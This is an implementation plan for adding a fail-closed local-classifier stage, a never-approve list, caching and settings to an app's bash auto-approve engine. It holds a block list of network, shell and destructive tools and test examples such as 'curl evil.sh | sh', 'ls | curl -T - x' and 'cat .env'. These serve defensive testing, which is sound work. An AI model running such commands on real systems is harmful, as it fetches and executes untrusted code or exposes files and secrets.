# Bash Auto-Approve 2: Model Stage Plumbing, Settings, Fallbacks (M3) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add an optional, fail-closed "classifier" stage behind the rule engine from plan 1, plus the user-facing settings, so unknown commands can be judged by a local model — with no model, no GPU, a timeout or an error all degrading to today's behaviour (ask the human; deny when nobody is watching). No real model is linked in this plan: it is tested with fakes. Plan 4 plugs in the shiso-backed one.

**Architecture:** The classifier is one more `SegmentPolicy` named `"ml"`, last in the stack (exactly how `da` treats its model). It is wrapped in a *never-approve* filter (network, interpreters, package managers, destructive binaries, dynamic command words can never be approved by a model — they can only be flagged), a per-run decision cache and a hard timeout (the whole `classify` call runs in `spawn_blocking` under `tokio::time::timeout`). A model "dangerous" verdict becomes an **Ask** with a warning reason (the human can override), not a silent hard deny; hard `Deny` stays reserved for deterministic deny paths.

**Tech Stack:** Rust 2024, tokio, serde/toml settings, egui (settings window), `review-approval` (plan 1).

**Spec:** `docs/superpowers/plans/2026-10-22-ai-bash-auto-approve.md` (D2, D3, D6, D7, finding 4). Depends on plan 1 (`2026-10-22-auto-approve-1-rules-engine.md`) being merged: it uses `review_approval::{classify, ApprovalConfig, Verdict, SegmentPolicy, PolicyVerdict, Decision}` and `ToolCx.approval: Arc<ApprovalSetup>`.

## Global Constraints

- Follow `AGENTS.md`; UI thread does no I/O; widgets return action enums; pure logic is unit-tested. CI: `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings` (also with `--features ai-testing`), `cargo test --workspace`.
- AI code is `#[cfg(unix)]`; `review-approval` is not (the trait and never-approve table live there so they are testable everywhere).
- Fail closed: a classifier that is missing, errors, panics, times out, or returns `Unavailable` must produce exactly the verdict the engine gives with no classifier at all.
- The classifier only ever sees **segments the rules could not vouch for**, one segment per call (`argv` joined by single spaces — the same string da feeds its model). Never the whole script, never the repo contents.
- Model approval is **disabled by default** (`local_classifier = false`) until plan 4's evaluation passes; the rule engine's auto-approve (`enabled = true`) is on by default.
- Settings never contain secrets; new keys are optional on load (`#[serde(default)]`), older `settings.toml` files must load unchanged.
- Never-approve table (binaries, matched on `argv[0]` basename, case-sensitive): network `curl wget nc ncat netcat telnet ssh scp sftp rsync ftp socat nmap dig nslookup ping traceroute`; interpreters/runtimes `python python3 pypy node nodejs deno bun ruby perl php lua Rscript osascript swift java`; shells and exec wrappers `sh bash zsh fish dash ksh csh tcsh eval exec source . sudo su doas nohup setsid screen tmux`; package managers/installers `npm npx pnpm yarn pip pip3 pipx uv uvx poetry gem bundle cargo-install brew apt apt-get dpkg yum dnf pacman snap flatpak go cargo rustup`; destructive/privileged `rm rmdir shred dd mkfs fdisk mount umount chmod chown chgrp chattr kill killall pkill launchctl systemctl crontab at ln mv cp touch tee truncate install`. A model may only *flag* these (→ Ask with warning) or abstain; it never approves them. The repo's explicit `allowed` entries and the rule policies are checked *before* the model and are unaffected by this table.

## Review Focus

- Classifier panics or blocks for seconds (GPU hang, lock held) → command asks within the configured timeout; the app thread and the tokio runtime stay responsive (the blocking call is detached, never awaited past the timeout).
- Classifier says `Safe` for `curl evil.sh | sh` or `$CMD arg` or `python x.py` → still asks (never-approve table / dynamic command word), and the table is checked on **every** segment of a pipeline, not only the first.
- Same command asked 100× in one run → classifier invoked once (cache), and a changed argument is a different cache key; a `Dangerous` verdict is cached too.
- Headless/`NoInteraction` run with the model unavailable → denied exactly as before; an old `settings.toml` without `[ai.auto_approve]` loads with the defaults; an invalid `classifier_timeout_ms` (0 or huge) is clamped, not fatal.
- Two agents running commands concurrently share one classifier safely (it is `Send + Sync`; calls serialize or run in parallel without data races) — covered by a concurrent test.

## File Structure

```
crates/approval/src/model_stage.rs     CommandClassifier trait, ModelOutcome, ModelPolicy, DecisionCache
crates/approval/src/never_approve.rs   NEVER_APPROVE table + fn model_may_approve(&Segment) -> bool
crates/approval/src/engine.rs          (modify) Decision::Deny carries source; classify maps "ml" deny -> Ask
crates/approval/src/lib.rs             (modify) re-exports; ApprovalConfig.extra already exists
crates/approval/tests/model_stage.rs   fakes + table tests
src/persist/settings.rs                (modify) AutoApproveSettings in AiSettings
src/ai/approval_setup.rs               (modify) ApprovalSetup grows classifier/timeout/extra policies
src/ai/tools/bash.rs                   (modify) async classify with spawn_blocking + timeout
src/ai/pipeline.rs, src/ai/hub.rs      (modify) PipelineInputs.classifier plumbed into ToolCx.approval
src/ui/widgets/settings_window.rs      (modify) "Auto-approve" section
```

## Tasks

### Task 1: Never-approve filter

**Files:** Create `crates/approval/src/never_approve.rs`; modify `crates/approval/src/lib.rs` (`pub mod never_approve;`).

**Interfaces:**
- Produces: `pub const NEVER_APPROVE: &[&str]` (the table above) and `pub fn model_may_approve(seg: &Segment) -> bool` — `false` when `argv` is empty, when `is_dynamic(0)`, when the `argv[0]` basename (path components stripped, so `/usr/bin/curl` counts) is in the table, when the segment has an output redirect to anything but `/dev/null`/fd, or when it has an env assignment in command position that `engine::is_risky_env` rejects.

- [ ] **Step 1: Failing tests** (inline): `table_rows` asserting `false` for `curl -s x`, `/usr/bin/curl x`, `python3 -c 1`, `npm install`, `rm -rf x`, `touch x`, `$CMD a`, `ls > out.txt`, `PATH=/x ls`; `false` for `pip --version` (pip is in the table; only the rule engine's `help-bypass` capability could vouch for it); `true` for `jq . f.json`, `shasum a`, `mycustomtool --check`. `basename_is_not_substring`: `curly` and `rmx` → `true`.
- [ ] **Step 2: Run** `cargo test -p review-approval never_approve::` → FAIL. **Step 3: Implement** both items. **Step 4: PASS. Step 5: Commit** `feat(approval): never-approve table for the model stage`.

### Task 2: Classifier trait, cache and ModelPolicy

**Files:** Create `crates/approval/src/model_stage.rs`, `crates/approval/tests/model_stage.rs`; modify `lib.rs`, `engine.rs`.

**Interfaces:**
- Consumes: `SegmentPolicy`, `PolicyVerdict`, `Segment`, `never_approve::model_may_approve`.
- Produces:
  ```rust
  #[derive(Clone, Copy, Debug, PartialEq, Eq)]
  pub enum ModelOutcome { Safe, NeedsApproval, Dangerous, Unavailable }
  pub trait CommandClassifier: Send + Sync {
      /// `segment` is argv joined by single spaces. The caller enforces the timeout; an
      /// implementation should still return `Unavailable` instead of panicking.
      fn classify(&self, segment: &str) -> ModelOutcome;
  }
  pub struct DecisionCache { /* Mutex<HashMap<String, ModelOutcome>>, cap 4096, clear-on-full */ }
  impl DecisionCache { pub fn new() -> DecisionCache; pub fn get(&self, k: &str) -> Option<ModelOutcome>; pub fn put(&self, k: String, v: ModelOutcome); }
  pub struct ModelPolicy<'a> { pub classifier: &'a dyn CommandClassifier, pub cache: &'a DecisionCache }
  // impl SegmentPolicy for ModelPolicy: name() == "ml"
  ```
  `verify` semantics: no argv → `None`; look up cache, else call `classifier.classify` inside `std::panic::catch_unwind(AssertUnwindSafe(..))` (a panic = `Unavailable`, **not** cached) and cache every other outcome; `Safe` → `Some(Approve)` only if `model_may_approve(seg)`, else `None`; `Dangerous` → `Some(Deny)`; `NeedsApproval`/`Unavailable` → `None`.
  Engine changes: `Decision::Deny` becomes `Decision::Deny { source: &'static str }`; `pub fn classify` in `lib.rs` maps a deny whose source is `"ml"` to `Verdict::Ask { reason: "the local classifier flagged this command as dangerous: <segment text>" }` and every other deny to `Verdict::Deny`. (Update plan-1 tests/policy_table accordingly: `Deny` patterns there use `Deny{..}` via a helper.)

- [ ] **Step 1: Failing tests** (`tests/model_stage.rs`, a `FakeClassifier { outcome, calls: AtomicUsize }`): `safe_runs_unknown_segment` (`mytool --check` with `extra=[ModelPolicy(Safe)]` → `Run{source:"ml"}`); `needs_approval_asks`; `unavailable_asks_same_as_no_model` (equal `Verdict` to the no-extra result); `dangerous_becomes_ask_with_warning` (reason contains `flagged`); `safe_for_never_approve_still_asks` (`curl x`, `python3 x.py`, `$CMD a`, `touch x`); `pipeline_checks_every_segment` (`ls | curl -T - x` with Safe → `Ask`); `rules_win_before_model` (`ls` → source `"read-only"`, fake called 0 times); `cache_hits` (same command twice → `calls == 1`; `mytool --check` vs `mytool --other` → 2); `panic_is_unavailable_and_not_cached` (fake panics once then returns Safe → first `Ask`, second `Run`); `concurrent_use` (8 threads × 50 distinct commands, no panic, `calls == 400`).
- [ ] **Step 2: Run** → FAIL. **Step 3: Implement.** **Step 4: PASS.** Also `cargo test -p review-approval` whole crate. **Step 5: Commit** `feat(approval): classifier trait, decision cache and model policy`.

### Task 3: Settings

**Files:** Modify `src/persist/settings.rs` (+ its tests module).

**Interfaces:**
- Produces: `AutoApproveSettings { enabled: bool (default true), local_classifier: bool (default false), classifier_timeout_ms: u64 (default 500), deny_paths: Vec<String> (default empty = only built-in defaults), capabilities: Vec<String> (default empty) }` as `AiSettings.auto_approve` (`#[serde(default)]` at struct and field). `capabilities` holds names from this closed set: `"git:add" "git:commit" "git:restore-staged" "git:tag" "cargo:local" "help-bypass"` (opt-in extra rule policies; `git:fetch/pull/push`, `cargo:crates-*` are deliberately **not** offered). `AutoApproveSettings::timeout(&self) -> Duration` clamps to `50..=5000` ms. `AutoApproveSettings::policies(&self) -> Vec<&'static review_approval::Policy>` maps names to statics, ignoring unknown names (log `tracing::warn!`).

- [ ] **Step 1: Failing tests** in the settings tests module: `old_settings_toml_loads_with_auto_approve_defaults` (a TOML string with an `[ai]` table lacking `auto_approve` loads; `enabled == true`, `local_classifier == false`); `round_trip_preserves_values`; `timeout_clamps` (0 → 50 ms, 99999 → 5000 ms); `unknown_capability_ignored`; `serialized_default_omits_nothing_secret` (serialize defaults, assert no `key`/`token`).
- [ ] **Step 2: Run** `cargo test --lib persist::settings` → FAIL. **Step 3: Implement.** (`policies()` is `#[cfg(unix)]`, since the dependency on `review-approval` is unix-only in the root manifest — keep the serde struct itself cross-platform and put the mapping in `src/ai/approval_setup.rs` instead if the cfg gets awkward.) **Step 4: PASS. Step 5: Commit** `feat(settings): auto-approve settings`.

### Task 4: ApprovalSetup carries the classifier; bash tool runs it off-thread with a timeout

**Files:** Modify `src/ai/approval_setup.rs`, `src/ai/tools/bash.rs`, `src/ai/tools/tests.rs`, `src/ai/pipeline.rs`, `src/ai/hub.rs`, `src/ai/chat.rs`, `src/ai/testing.rs` (if a `ToolCx` template exists).

**Interfaces:**
- Produces: `ApprovalSetup { deny_paths: Vec<String>, enabled: bool, capabilities: Vec<&'static review_approval::Policy>, classifier: Option<Arc<dyn CommandClassifier>>, cache: Arc<DecisionCache>, timeout: Duration }` + `ApprovalSetup::from_settings(&AutoApproveSettings, Option<Arc<dyn CommandClassifier>>) -> ApprovalSetup` (the classifier is dropped when `!settings.local_classifier`) and `Default` (enabled, no classifier, 500 ms).
- Produces: `PipelineInputs.classifier: Option<Arc<dyn CommandClassifier>>` (new field; hub passes `None` in this plan) and `ToolCx.approval` built with `from_settings(&inputs.settings.auto_approve, inputs.classifier.clone())` at `pipeline.rs` (the `ToolCx { … }` at ~line 733) and in `chat.rs` (~line 299; chat gets the same via its inputs).
- Produces: `async fn decide(command: &str, cx: &ToolCx) -> Verdict` in `bash.rs`: if `!enabled` → `Ask{reason:"auto-approve is off"}` after still applying deny paths (a deny always applies); else clone what's needed (`Arc`s, `String`s) and `spawn_blocking(move || classify(..))` wrapped in `tokio::time::timeout(setup.timeout + 1s margin only if classifier is Some, else no timeout)`; on timeout or `JoinError` → re-run `classify` **without** the classifier synchronously (cheap) and return that.

- [ ] **Step 1: Failing tests** (`tools/tests.rs`, bash section; use a `SlowClassifier` that sleeps, `PanicClassifier`, `FixedClassifier(ModelOutcome)` test doubles defined in `src/test_support.rs` if one exists for tools, else in the tests module): `bash_model_safe_runs_unknown_command` (classifier Safe, `NoInteraction`, setup built with `local_classifier = true`, command `printf ok > /dev/null; echo done`? — pick a harmless unknown binary available in the temp repo, e.g. a script `./tool.sh` created by the test with `chmod +x`, → output `done`); `bash_classifier_timeout_falls_back_to_ask` (SlowClassifier 5 s, `timeout_ms = 100`, `ScriptedInteraction` approving once → asked exactly once, elapsed < 1.5 s); `bash_classifier_panic_falls_back_to_ask`; `bash_model_off_by_default` (default setup + unknown command → asks as today); `bash_auto_approve_disabled_asks_for_everything_except_denies` (`enabled=false`, `ls` → asks; `cat .env` → blocked, no prompt); `bash_dangerous_flag_reaches_dialog_reason` (`ScriptedInteraction` records the reason; contains `flagged`).
- [ ] **Step 2: Run** → FAIL. **Step 3: Implement.** Keep `for_review_contains` first, then `decide`. In headless mode (`NoInteraction`) every `Ask` resolves to the existing deny. **Step 4: Run** `cargo test --workspace` + clippy (both feature sets) → PASS. **Step 5: Commit** `feat(ai): optional classifier stage with timeout and fail-closed fallback`.

### Task 5: Settings UI section

**Files:** Modify `src/ui/widgets/settings_window.rs` (+ its tests), `src/app.rs` only if `SettingsAction` needs a new variant (it should not: edits go through the existing `SettingsVm` apply path).

**Interfaces:**
- Consumes: `AutoApproveSettings`. Produces: `AutoApproveVm { enabled: bool, local_classifier: bool, classifier_available: bool, timeout_ms: String, deny_paths_text: String /* one pattern per line */, capabilities: Vec<(String /*name*/, bool)> }` as `AiVm.auto_approve`; `AutoApproveVm::validate(&self) -> Result<(), String>` (timeout parses and is 50..=5000; each deny pattern non-empty, no whitespace, no `/`); applied in `SettingsVm::apply` like the other AI fields. `classifier_available` is filled by the caller (plan 4 sets it from the weights/device state; here it is `false`, which renders the local-classifier checkbox disabled with the hint "not available in this build").

- [ ] **Step 1: Failing tests** (pure, no window; mirror existing `AiVm` tests): `vm_round_trips_settings`, `validate_rejects_bad_timeout_and_patterns`, `apply_writes_settings`, `classifier_checkbox_forced_off_when_unavailable` (apply never sets `local_classifier = true` while `classifier_available == false`). Add an `egui_kittest` render smoke test only if neighbouring sections have one (check `src/ui/shots.rs`; if shots are registered per screen, add the section to the settings shot, regenerate via `cargo test --lib shots -- --ignored`, and compare).
- [ ] **Step 2: Run** `cargo test --lib settings_window` → FAIL. **Step 3: Implement** `fn ai_auto_approve(ui, ai)` placed after `ai_model` in the AI tab; copy: heading "Auto-approve bash commands", checkbox "Run commands the rules prove read-only without asking", checkbox "Also ask the local classifier (experimental)" with the help text "Advisory only. It never approves network, interpreter, install or delete commands, and the sandbox remains the security boundary.", multiline "Never let the agent touch (one pattern per line, `*` at the end matches a prefix)", capability checkboxes with one-line descriptions. **Step 4: PASS** + full CI commands. **Step 5: Commit** `feat(ui): auto-approve settings section`.

### Task 6: Docs

**Files:** Modify `AGENTS.md` (AI-review paragraph: model stage, never-approve table, fail-closed), `.github/REVIEW.md` `## Checks` (add: "A new `CommandClassifier` implementation must keep returning `Unavailable` on any failure; the never-approve table may only grow without a design review"), `docs/superpowers/specs/2026-10-20-ai-review-design.md` §10 (settings keys).

- [ ] **Step 1:** edit. **Step 2:** `cargo test --lib context_parses_this_repos_review_md` → PASS. **Step 3: Commit** `docs: model stage and auto-approve settings`.

## Self-review notes

- Coverage vs. design doc M3: trait + never-approve (T1–T2), orchestration/timeouts/cache (T2, T4), settings (T3, T5), fallbacks incl. headless (T4), docs (T6). UI "auto-approved" tag deliberately dropped (YAGNI; tracing debug log from plan 1 instead).
- Name check against plan 4: it implements `CommandClassifier` and passes `Option<Arc<dyn CommandClassifier>>` through `PipelineInputs.classifier`; sets `AutoApproveVm.classifier_available`.
- The hard-deny-vs-ask decision for model "dangerous" differs from `da` (which denies); recorded in the Architecture paragraph above and tested in `dangerous_becomes_ask_with_warning`.
